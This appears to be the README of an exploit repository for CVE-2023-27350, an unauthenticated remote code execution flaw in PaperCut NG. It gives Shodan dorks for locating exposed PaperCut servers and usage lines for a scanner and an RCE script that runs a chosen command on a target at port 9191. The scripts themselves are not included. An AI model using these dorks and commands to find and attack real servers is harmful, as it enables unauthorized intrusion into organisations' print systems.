# CVE-2023-27350
![](https://img.shields.io/static/v1?label=Product&message=PaperCut%20NG&color=blue)
![](https://img.shields.io/static/v1?label=Version&message=22.0.5%20(Build%2063914)&color=brighgreen)
![](https://img.shields.io/static/v1?label=Vulnerability&message=CVSSv3:%209.8.%20Unauthenticated%20Remote%20Code%20Execution&color=red)


- Shodan dork
```
http.html:"papercut"
http.html:"papercut" port:9191
http.title:"PaperCut Login"
```  
## Usage <br/>
- Check
```
python3 scanner.py
Enter IP:
```
- RCE    
```
python3 papercut_rce.py --url 'http://ip:9191' --command calc.exe
```
